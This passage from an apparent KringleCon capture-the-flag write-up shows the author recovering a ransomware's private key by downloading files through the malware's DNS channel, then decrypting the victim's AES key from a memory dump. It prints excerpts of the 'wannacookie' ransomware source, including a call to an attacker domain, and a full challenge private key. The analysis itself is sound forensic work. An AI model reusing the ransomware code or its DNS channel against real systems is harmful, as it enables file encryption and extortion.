representation:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;================ Filters ================
1| MATCHES  bool(re.search(r&amp;quot;^[0-9a-fA-F]+$&amp;quot;,variable_values))
2| LENGTH  len(variable_values) == 32

[i] 5 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches &amp;quot;[python_regex]&amp;quot;    | match python regex inside quotes
len            | len [&amp;gt;|&amp;lt;|&amp;gt;=|&amp;lt;=|==] [bt_size]| Variables length &amp;gt;,&amp;lt;,=,&amp;gt;=,&amp;lt;= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print all
&lt;span class="hll"&gt;033ecb2bc07a4d43b5ef94ed5a35d280
&lt;/span&gt;Variable Values #1 above ^
Type any key to go back and just Enter to Continue...
&lt;span class="hll"&gt;cf522b78d86c486691226b40aa69e95c
&lt;/span&gt;Variable Values #2 above ^
Type any key to go back and just Enter to Continue...
&lt;span class="hll"&gt;9e210fe47d09416682b841769c78b8a3
&lt;/span&gt;Variable Values #3 above ^
Type any key to go back and just Enter to Continue...
&lt;span class="hll"&gt;4ec4f0187cb04f4cb6973460dfe252df
&lt;/span&gt;Variable Values #4 above ^
Type any key to go back and just Enter to Continue...
&lt;span class="hll"&gt;27c87ef9bbda4f709f6b4002fa4af63c
&lt;/span&gt;Variable Values #5 above ^
Type any key to go back and just Enter to Continue...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&amp;quot;Huh&amp;quot;, I thought, &amp;quot;these keys look familiar&amp;quot;. That's because I had already
found them in the memory dump using &lt;code&gt;strings&lt;/code&gt;! And I know that they're
not the correct keys!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id45"&gt;The right solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Despair fell on me again. Now I was freshly out of ideas, again! I then turned
to my last resort: the KringleCon chat. People told me that maybe I shouldn't
try to look directly for the key in memory, but to another form. I also noticed
that people were talking a lot about public/private key encryption.&lt;/p&gt;
&lt;p&gt;And then it clicked: I should look for the encrypted key in memory, that is
the value of the &lt;code&gt;$p_k_e_k&lt;/code&gt; variable. But even if I find this value, how
will I decrypt it without the private key? My colleague &lt;a class="reference external" href="https://github.com/imaibou"&gt;imaibou&lt;/a&gt; mentioned that he tried to factor the public
key using &lt;a class="reference external" href="https://eprint.iacr.org/2015/398.pdf"&gt;weak factors&lt;/a&gt;, but to no
avail. I saw in the KringleCon chat that some people had managed to find the
ransomware's private key.&lt;/p&gt;
&lt;p&gt;And then it cliked again! I thought back to the first hint, the one I didn't
understand, talking about &lt;code&gt;wannacookie.min.ps1&lt;/code&gt;. Remember the hash we
used for our Snort rule? Its value is
&lt;code&gt;77616E6E61636F6F6B69652E6D696E2E707331&lt;/code&gt;. What happens if we decode this
hex value?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; 77616E6E61636F6F6B69652E6D696E2E707331 &lt;span class="p"&gt;|&lt;/span&gt; xxd -r -p
&lt;span class="go"&gt;wannacookie.min.ps1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can encode some file names in hexadecimal, and then download them from the
DNS server, using the &lt;code&gt;g_o_dns&lt;/code&gt; PowerShell function. For example, let's
try to download an unminified version of the malware. We can kind of guess
that the filename will be &lt;code&gt;wannacookie.ps1&lt;/code&gt;. Let's encode this, and
download it with &lt;code&gt;g_o_dns&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -n wannacookie.ps1 &lt;span class="p"&gt;|&lt;/span&gt; xxd -p
&lt;span class="go"&gt;77616e6e61636f6f6b69652e707331&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;g_o_dns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;77616e6e61636f6f6b69652e707331&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.\&lt;/span&gt;&lt;span class="n"&gt;wannacookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ps1&lt;/span&gt;
&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;Get-Content&lt;/span&gt; &lt;span class="p"&gt;.\&lt;/span&gt;&lt;span class="n"&gt;wannacookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ps1&lt;/span&gt;
&lt;span class="go"&gt;$functions = {&lt;/span&gt;
&lt;span class="go"&gt;    function Enc_Dec-File($key, $File, $enc_it) {&lt;/span&gt;
&lt;span class="go"&gt;        [byte[]]$key = $key&lt;/span&gt;
&lt;span class="go"&gt;        $Suffix = &amp;quot;`.wannacookie&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;        [System.Reflection.Assembly]::LoadWithPartialName(&amp;#39;System.Security.Cryptography&amp;#39;)&lt;/span&gt;
&lt;span class="go"&gt;        [System.Int32]$KeySize = $key.Length*8&lt;/span&gt;
&lt;span class="go"&gt;        $AESP = New-Object &amp;#39;System.Security.Cryptography.AesManaged&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;function wannacookie {&lt;/span&gt;
&lt;span class="go"&gt;    $S1 = &amp;quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;    if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}&lt;/span&gt;
&lt;span class="go"&gt;    if ($(netstat -ano | Select-String &amp;quot;127.0.0.1:8080&amp;quot;).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne &amp;quot;KRINGLECASTLE&amp;quot;) {return}&lt;/span&gt;
&lt;span class="go"&gt;    $pub_key = [System.Convert]::FromBase64String($(get_over_dns(&amp;quot;7365727665722E637274&amp;quot;) ) )&lt;/span&gt;
&lt;span class="go"&gt;    $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join &amp;#39;&amp;#39;))  | ? {$_ -ne 0x00})&lt;/span&gt;
&lt;span class="go"&gt;    $Hex_key = $(B2H $Byte_key)&lt;/span&gt;
&lt;span class="go"&gt;    $Key_Hash = $(Sha1 $Hex_key)&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Awesome, we can download file from the DNS server. Now, let's go back to the
malware's source code. How did it download the public key?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;$p_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.Convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;($(&lt;/span&gt;&lt;span class="n"&gt;g_o_dns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7365727665722E637274&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's decode the &lt;code&gt;7365727665722E637274&lt;/code&gt; string:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; 7365727665722E637274 &lt;span class="p"&gt;|&lt;/span&gt; xxd -p -r
&lt;span class="go"&gt;server.crt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, apparently, the public key was in a file called &lt;code&gt;server.crt&lt;/code&gt;. What's
the name of the file containing the private key? Let's try something simple,
such as &lt;code&gt;server.key&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -n server.key &lt;span class="p"&gt;|&lt;/span&gt; xxd -p
&lt;span class="go"&gt;7365727665722e6b6579&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;g_o_dns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7365727665722e6b6579&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;-----BEGIN PRIVATE KEY-----&lt;/span&gt;
&lt;span class="go"&gt;MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG&lt;/span&gt;
&lt;span class="go"&gt;L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui&lt;/span&gt;
&lt;span class="go"&gt;W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq&lt;/span&gt;
&lt;span class="go"&gt;jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S&lt;/span&gt;
&lt;span class="go"&gt;TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3&lt;/span&gt;
&lt;span class="go"&gt;HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4&lt;/span&gt;
&lt;span class="go"&gt;tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc&lt;/span&gt;
&lt;span class="go"&gt;0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW&lt;/span&gt;
&lt;span class="go"&gt;OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN&lt;/span&gt;
&lt;span class="go"&gt;6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U&lt;/span&gt;
&lt;span class="go"&gt;3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm&lt;/span&gt;
&lt;span class="go"&gt;Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9&lt;/span&gt;
&lt;span class="go"&gt;uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2&lt;/span&gt;
&lt;span class="go"&gt;Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG&lt;/span&gt;
&lt;span class="go"&gt;4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB&lt;/span&gt;
&lt;span class="go"&gt;0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498&lt;/span&gt;
&lt;span class="go"&gt;/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q&lt;/span&gt;
&lt;span class="go"&gt;8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE&lt;/span&gt;
&lt;span class="go"&gt;KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4&lt;/span&gt;
&lt;span class="go"&gt;eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v&lt;/span&gt;
&lt;span class="go"&gt;sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx&lt;/span&gt;
&lt;span class="go"&gt;moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy&lt;/span&gt;
&lt;span class="go"&gt;DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4&lt;/span&gt;
&lt;span class="go"&gt;Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE&lt;/span&gt;
&lt;span class="go"&gt;JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq&lt;/span&gt;
&lt;span class="go"&gt;UdrzXvSwyFuuIqBlkHnWSIeC&lt;/span&gt;
&lt;span class="go"&gt;-----END PRIVATE KEY-----&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Awesome! We now have the ransomware's private key! We can use it to recover our
AES key. But first, we must find our encrypted AES key in our memory dump. To
know what we're looking for, let's encrypt a fake AES key using the
ransomware's source code and public key, to see the result:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="nv"&gt;$p_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.Convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;($(&lt;/span&gt;&lt;span class="n"&gt;g_o_dns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7365727665722E637274&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="nv"&gt;$b_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;@(&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;p_k_e&lt;/span&gt; &lt;span class="nv"&gt;$b_k&lt;/span&gt; &lt;span class="nv"&gt;$p_k&lt;/span&gt;
&lt;span class="go"&gt;b9554cb7ea6ff46c689d90a8d42fc9b9692552d42b6ca34c8aa4593602e7d0cbef88d5dda935960c4ab4e92d789e290c58bf1a280ca9bbf502a8c43ad0eba242e2c8000d5e81fb73aa381dff97cf58c51bb1a49d3a54c15a4de84cf3029cc9dba7364ccc78e95058480f25719cb6aa7763469175dadd031113f6f64ba461adb5303a5c65cb6260bf1ca24eed4e251a99f4219cee6f35aa166e29c3215381bfecd0f9b3eded6acfeeaf8695f55b8e3741c8ca365f8a81560fb92e1bddb11b1bb19399b0a377dd5226e0930ea812c8c151382a7508aab93b4a9f19535fa2808b23520f249bb63d747f3e49a4b279a3cafcadba4daa2175b35d8841def66a2abfd4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, the encrypted key we're looking for seems to be a 512-byte long hex
representation. Let's use &lt;code&gt;strings&lt;/code&gt; and &lt;code&gt;grep&lt;/code&gt; to look for
something like this in the memory dump:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; strings -e b powershell.exe_181109_104716.dmp&lt;span class="p"&gt;|&lt;/span&gt; grep -E &lt;span class="s1"&gt;&amp;#39;^[0-9a-f]{512}$&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We got a unique match! This may be our luck. Let's hex-decode this string, and
try to decrypt it. To decrypt it, I'll use &lt;code&gt;openssl&lt;/code&gt; to generate a full
certificate, with combined public and private keys in a single file. The
resulting &lt;code&gt;.pfx&lt;/code&gt; file won't have any passphrase:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;NB: Before that, make sure that you add&lt;/em&gt; &lt;code&gt;-----BEGIN CERTIFICATE-----&lt;/code&gt;
&lt;em&gt;and&lt;/em&gt; &lt;code&gt;-----END CERTIFICATE-----&lt;/code&gt; &lt;em&gt;in the public key file.&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; strings -e b powershell.exe_181109_104716.dmp&lt;span class="p"&gt;|&lt;/span&gt; grep -E &lt;span class="s1"&gt;&amp;#39;^[0-9a-f]{512}$&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xxd -p -r &amp;gt; encrypted_aes_key.raw
&lt;span class="gp"&gt;$&lt;/span&gt; openssl pkcs12 -export -in ./public.cer -inkey ./private.key -out wannacookie_cert.pfx
&lt;span class="go"&gt;Enter Export Password:&lt;/span&gt;
&lt;span class="go"&gt;Verifying - Enter Export Password:&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now let's decrypt this key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="nv"&gt;$wannacookie_cert&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Security&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Cryptography&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X509Certificates&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X509Certificate2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;C:\path\to\wannacookie_cert.pfx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="nv"&gt;$key_bytes&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.IO.File]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ReadAllBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;C:\path\to\encrypted_aes_key.raw&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;PS C:\&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;$wannacookie_cert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PrivateKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key_bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$true&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;fbcfc121915d99cc20a3d3d5d84f8308&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have our decrypted key (well, &lt;em&gt;a&lt;/em&gt; decrypted key). Let's see if it works.
Since I loath PowerShell's syntax, I'm using a little Python script to decrypt
Alabaster's password database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Crypto.Cipher&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Usage: {} &amp;lt;file_to_decrypt&amp;gt; &amp;lt;key&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;encrypted_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;decrypted_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;encrypted_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.wannacookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# We read 4 bytes to get the IV&amp;#39;s size&lt;/span&gt;
        &lt;span class="n"&gt;iv_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unpack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="c1"&gt;# We read the IV&lt;/span&gt;
        &lt;span class="n"&gt;iv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iv_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# We read the rest of the file&lt;/span&gt;
        &lt;span class="n"&gt;encrypted_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;aes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MODE_CBC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;iv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;decrypted_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;aes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted_content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
